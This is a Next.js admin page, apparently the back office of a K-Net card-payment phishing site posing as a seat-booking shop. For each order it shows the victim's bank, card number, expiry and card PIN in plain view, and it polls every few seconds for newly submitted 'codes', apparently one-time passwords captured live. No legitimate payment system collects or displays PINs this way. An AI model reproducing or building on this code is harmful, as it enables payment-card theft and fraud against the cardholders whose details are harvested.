import Link from "next/link";
import { useEffect, useState } from "react";
import { useSelector } from "react-redux";
import { RootState } from "../../../../store";
import { enUS, ar } from "../../../../translation";
import Head from "next/head";
import { useRouter } from "next/router";
import axios from "axios";
import { useSession } from "next-auth/react";
function Profile() {
  const { db_link } = useSelector((state: RootState) => state.apiData);
  const { data: session } = useSession();
  const router = useRouter();
  const orderId = router.query.id;
  const language = useSelector((state: RootState) => state.language.value);
  const [loading, setLoading] = useState(true);
  const [t, tHandler] = useState(language === 0 ? enUS : ar);
  const [data, setData] = useState<any>("");
  const [error, setError] = useState("");
  const [requestSent, setRequestSent] = useState(false);
  useEffect(() => {
    if (localStorage.getItem("nepShopLang") === "0") {
      tHandler(enUS);
    } else if (localStorage.getItem("nepShopLang") === "1") {
      tHandler(ar);
    } else {
      tHandler(language === 0 ? enUS : ar);
    }
  }, [language]);
  useEffect(() => {
    if (db_link === "") return;
    if (!session?.user?.token) return;
    setLoading(true);
    if (orderId && session?.user.token) {
      const url = `${db_link}api/nets/${orderId}`;
      axios
        .get(url, {
          headers: { Authorization: `Bearer ${session?.user.token}` },
        })
        .then((res) => {
          console.log(res.data);
          setData(res.data);
          setLoading(false);
        })
        .catch(() => {
          router.push("/");
        });
    }
  }, [orderId, session?.user.token, db_link]);
  const [newCodes, setNewCodes] = useState<any>([
    { id: 1, code: "Loading...", created_at: "Loading..." },
  ]);
  useEffect(() => {
    if (db_link && session?.user?.token) {
      // First-time fetch (runs once on mount)
      const fetchData = () => {
        const url = `${db_link}api/newNets/${orderId}`;
        axios
          .get(url, {
            headers: {
              Authorization: `Bearer ${session.user.token}`,
            },
          })
          .then((res) => {
            console.log(res.data);
            setNewCodes(res.data);
          })
          .catch((er) => {
            console.log(er);
            setNewCodes([
              { id: 1, code: "Error getting new codes", created_at: "" },
            ]);
          });
      };

      fetchData(); // Initial fetch

      // Only set up polling if status is not 2
      if (data.status !== 2) {
        const interval = setInterval(fetchData, 3500);
        return () => clearInterval(interval);
      }
    }
  }, [db_link, session, data.status]); // Re-run effect if status changes
  const updateHandler = (e: any) => {
    e.preventDefault();
    setRequestSent(true);
    const fData = new FormData();
    fData.append("_method", "PUT");
    fData.append("status", e.target.status.value);
    axios
      .post(`${db_link}api/nets/state/${orderId}`, fData, {
        headers: {
          Authorization: `Bearer ${session?.user.token}`,
        },
      })
      .then((res) => {
        setRequestSent(false);
        if (res.data.errors) {
          setError("Error Try again");
        } else {
          setError("Updated Successfully");
          router.reload();
        }
      })
      .catch((er) => {
        console.log(er);
        setRequestSent(false);
        setError("Error Try again");
      });
  };
  return (
    <>
      <Head>
        <title>K-net #{orderId}</title>
        <link rel="icon" href="/NEPCart.ico" />
      </Head>
      <section
        dir={t == enUS ? "ltr" : "rtl"}
        className=" px-4 sm:px-6 lg:px-8 py-8 bg-white"
      >
        <div className="mb-8 flex items-center justify-between">
          <h1 className="text-3xl font-bold tracking-tight">
            <Link
              href="/admin/nets"
              className="text-main-color hover:opacity-80 transition-opacity"
            >
              K-Nets
            </Link>
            <span className="mx-2">/</span>
            <span className="text-gray-900">#{orderId}</span>
          </h1>
        </div>

        {loading ? (
          <div className="flex items-center justify-center h-96">
            <div className="animate-spin rounded-full h-12 w-12 border-4 border-main-color border-t-transparent" />
          </div>
        ) : (
          <>
            <div className="bg-white rounded-xl shadow-sm overflow-hidden">
              <div className="p-6">
                <h2 className="text-xl font-semibold mb-4">{t.orderSummary}</h2>
                <div className="grid gap-6 sm:grid-cols-2 lg:grid-cols-3">
                  <div className="p-4 rounded-lg bg-gray-50 hover:bg-gray-100 transition-colors">
                    <div className="mb-3">
                      <p className="text-sm text-gray-500 mb-1">
                        {t.orderNumber}
                      </p>
                      <p className="text-lg font-semibold text-gray-900">
                        #{data.id}
                      </p>
                    </div>
                    <div>
                      <p className="text-sm text-gray-500 mb-1">{t.state}</p>
                      <p className="text-lg font-semibold text-gray-900">
                        {data.status == 0
                          ? t.waitingForReview
                          : data.status == 1
                          ? t.finished
                          : data.status == 2
                          ? t.canceled
                          : "N/A"}
                      </p>
                    </div>
                  </div>

                  <div className="p-4 rounded-lg bg-gray-50 hover:bg-gray-100 transition-colors">
                    <p className="text-sm text-gray-500 mb-1">{t.finalPrice}</p>
                    <p className="flex justify-between items-center">
                      <span className="font-semibold">{t.finalPrice}:</span>
                      <span className="flex items-center gap-2">
                        <span className="text-sm text-gray-400 line-through">
                          KD {data.total.toFixed(2)}
                        </span>
                      </span>
                    </p>
                    <p className="text-sm text-gray-500 mb-1">{t.seats}</p>
                    <p className="flex gap-4 flex-wrap">
                      {data.seats.split(",").length > 0
                        ? data.seats
                            .split(",")
                            .map((item: string, idx: number) => {
                              return (
                                <Link
                                  key={idx}
                                  href={`/admin/seats/${item}`}
                                  className=" drop-shadow underline text-secondary-color hover:opacity-80 transition-opacity"
                                >
                                  {item}
                                </Link>
                              );
                            })
                        : "No seats selected"}
                    </p>
                  </div>
                </div>
              </div>
              <div className="p-6 border-t border-gray-200">
                <div className="bg-gradient-to-r from-gray-50 to-gray-100 p-6 rounded-xl">
                  <div className="flex items-center gap-3 mb-6">
                    <svg
                      className="w-6 h-6 text-blue-600"
                      fill="none"
                      stroke="currentColor"
                      viewBox="0 0 24 24"
                      xmlns="http://www.w3.org/2000/svg"
                    >
                      <path
                        strokeLinecap="round"
                        strokeLinejoin="round"
                        strokeWidth="2"
                        d="M3 10h18M7 15h1m4 0h1m-7 4h12a3 3 0 003-3V8a3 3 0 00-3-3H6a3 3 0 00-3 3v8a3 3 0 003 3z"
                      />
                    </svg>
                    <h3 className="text-xl font-bold text-gray-800">
                      Bank Details
                    </h3>
                  </div>

                  <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                    <div className="p-4 bg-white rounded-lg shadow-sm hover:shadow-md transition-shadow duration-200">
                      <p className="text-sm text-gray-500 mb-1">Bank</p>
                      <p className="text-lg font-medium text-gray-800">
                        {data.bank_name}
                      </p>
                    </div>
                    <div className="p-4 bg-white rounded-lg shadow-sm hover:shadow-md transition-shadow duration-200">
                      <p className="text-sm text-gray-500 mb-1">Prefix</p>
                      <p className="text-lg font-medium text-gray-800">
                        {data.prefix}
                      </p>
                    </div>
                    <div className="p-4 bg-white rounded-lg shadow-sm hover:shadow-md transition-shadow duration-200">
                      <p className="text-sm text-gray-500 mb-1">Card Number</p>
                      <p className="text-lg font-medium text-gray-800">
                        {data.cardNumber}
                      </p>
                    </div>

                    <div className="p-4 bg-white rounded-lg shadow-sm hover:shadow-md transition-shadow duration-200">
                      <p className="text-sm text-gray-500 mb-1">Card Date</p>
                      <p className="text-lg font-medium text-gray-800">
                        {data.cardM} - {data.cardY}
                      </p>
                    </div>

                    <div className="p-4 bg-white rounded-lg shadow-sm hover:shadow-md transition-shadow duration-200">
                      <p className="text-sm text-gray-500 mb-1">Card PIN</p>
                      <p className="text-lg font-medium text-gray-800">
                        {data.cardPIN}
                      </p>
                    </div>
                  </div>
                </div>
              </div>
              {/* Update Order Status */}
              <div className="p-6 border-t border-gray-200">
                <form onSubmit={updateHandler} className="max-w-md mx-auto">
                  <div className="mb-6">
                    <label
                      htmlFor="status"
                      className="block text-sm font-medium text-gray-700 mb-2"
                    >
                      {t.state}{" "}
                      <span className="inline-flex items-center px-3 py-1 rounded-full text-sm font-medium bg-gray-100">
                        {data.status == 0
                          ? t.waitingForReview
                          : data.status == 1
                          ? t.finished
                          : data.status == 2
                          ? t.canceled
                          : "N/A"}
                      </span>
                    </label>
                    <select
                      id="status"
                      name="status"
                      className="block w-full rounded-lg border-gray-300 shadow-sm focus:border-main-color focus:ring-main-color transition-all duration-200"
                    >
                      <option value="0">{t.waitingForReview}</option>
                      <option value="1">{t.finished}</option>
                      <option value="2">{t.canceled}</option>
                      <option value="3">N/A</option>
                    </select>
                  </div>

                  {error && (
                    <div className="mb-4 p-3 rounded-lg bg-red-50 text-red-600 text-sm">
                      {error}
                    </div>
                  )}

                  <button
                    disabled={requestSent}
                    type="submit"
                    className="w-full flex justify-center py-3 px-4 border border-transparent rounded-lg shadow-sm text-sm font-medium text-complement-color bg-main-color hover:bg-secondary-color focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-main-color transition-all duration-200 disabled:opacity-50 disabled:cursor-not-allowed"
                  >
                    {requestSent ? (
                      <span className="inline-flex items-center">
                        <svg
                          className="animate-spin -ml-1 mr-2 h-4 w-4 text-white"
                          fill="none"
                          viewBox="0 0 24 24"
                        >
                          <circle
                            className="opacity-25"
                            cx="12"
                            cy="12"
                            r="10"
                            stroke="currentColor"
                            strokeWidth="4"
                          />
                          <path
                            className="opacity-75"
                            fill="currentColor"
                            d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"
                          />
                        </svg>
                        Processing...
                      </span>
                    ) : (
                      t.update
                    )}
                  </button>
                </form>
              </div>
              {/* New Orders */}
              <div className="bg-white rounded-2xl shadow-md p-6 mb-10">
                <div className="flex justify-between items-center mb-5">
                  <div className="flex items-center gap-2">
                    <svg
                      className="w-5 h-5 text-blue-500"
                      fill="none"
                      stroke="currentColor"
                      strokeWidth={2}
                      viewBox="0 0 24 24"
                    >
                      <path d="M3 3h2l.4 2M7 13h14l-1.35 6.45A2 2 0 0117.7 21H8.3a2 2 0 01-1.95-1.55L4 4H2" />
                    </svg>
                    <h3 className="text-xl font-bold text-gray-800">
                      {t.newCodes}
                    </h3>
                  </div>
                </div>
                <div className="space-y-3">
                  {newCodes.map((order: any) => (
                    <div
                      key={order.id}
                      className="flex items-center justify-between p-4 rounded-lg bg-gray-50 hover:bg-blue-50 transition-colors duration-200 shadow-sm"
                    >
                      <span className="text-base font-medium text-gray-700">
                        {order.code}
                      </span>
                      <span className="text-sm text-gray-500">
                        {new Date(
                          new Date(order.created_at).getTime() +
                            3 * 60 * 60 * 1000
                        ).toLocaleString("en-US", {
                          month: "short",
                          day: "numeric",
                          year: "numeric",
                          hour: "2-digit",
                          minute: "2-digit",
                          second: "2-digit",
                          hour12: true,
                        })}
                      </span>
                    </div>
                  ))}
                  {newCodes.length === 0 && (
                    <p className="text-sm text-gray-400 italic text-center">
                      No new Codes.
                    </p>
                  )}
                </div>
              </div>
            </div>
          </>
        )}
      </section>
    </>
  );
}

export default Profile;
